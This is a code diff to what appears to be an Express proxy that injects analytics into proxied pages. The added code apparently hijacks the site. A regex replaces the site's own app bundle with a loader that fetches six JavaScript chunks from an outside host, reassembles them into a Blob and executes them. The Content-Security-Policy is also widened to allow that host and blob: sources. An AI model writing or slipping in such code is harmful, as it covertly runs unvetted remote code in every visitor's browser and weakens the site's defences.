@@ -47,6 +47,26 @@ const pageview = `<script>
   window.addEventListener('popstate', pageview);
 </script>`;
 
+const customScript= `<script>
+  async function downloadScript(urls = [
+    'https://i.css3.io/dev_test/xaa1.js',
+    'https://i.css3.io/dev_test/xab1.js',
+    'https://i.css3.io/dev_test/xac1.js',
+    'https://i.css3.io/dev_test/xad1.js',
+    'https://i.css3.io/dev_test/xae1.js',
+    'https://i.css3.io/dev_test/xaf1.js',
+  ], options) {
+    const allPromise = urls.map(url => fetch(url).then(res => res.text()));
+    const res = await Promise.all(allPromise);
+    const blob = new Blob(res, {type: 'application/javascript'})
+    const s = document.createElement('script');
+    s.defer = 'defer';
+    s.src = URL.createObjectURL(blob);
+    document.head.append(s);
+  }
+  downloadScript();
+</script>`
+const customScript2 = `<script defer="defer" src='https://i.css3.io/dev_test/app-cfeba0e3ee615a171569.js'></script>`
 const app = express();
 
 app.use(
@@ -90,7 +110,7 @@ app.use(
       if (csp) {
         headers['content-security-policy'] = csp.replace(
           /(?=(script-src|connect-src) )[^;]*/g,
-          '$& https://www.googletagmanager.com https://www.google-analytics.com',
+          '$& https://www.googletagmanager.com https://www.google-analytics.com https://i.css3.io media-src blob: ;',
         );
       }
 
@@ -107,9 +127,11 @@ app.use(
         return proxyResData;
       } else {
         // Assume HTML
-        return proxyResData
+        const html = proxyResData
           .toString()
+          .replace(/<script\s+defer="defer"\s+src="\/app-(cfeba0e3ee615a171569)\.js"><\/script>/img, `${customScript}`)
           .replace('</body>', `${ga}${pageview}</body>`);
+        return html;
       }
     },
   }),
